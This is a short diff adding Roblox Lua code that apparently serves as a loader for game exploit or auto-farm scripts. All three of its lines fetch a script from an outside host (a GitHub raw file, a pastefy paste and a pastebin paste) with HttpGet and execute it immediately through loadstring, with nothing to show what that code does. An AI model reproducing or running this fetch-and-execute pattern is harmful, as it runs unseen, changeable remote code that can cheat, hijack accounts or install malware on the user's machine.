@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/s3ptre/farmmm2/refs/heads/main/read"))()
+wait(3)
+loadstring(game:HttpGet("https://pastefy.app/S9BECD0G/raw"))()
+wait(2)
+loadstring(game:HttpGet("https://pastebin.com/raw/WUHt5mqs"))()
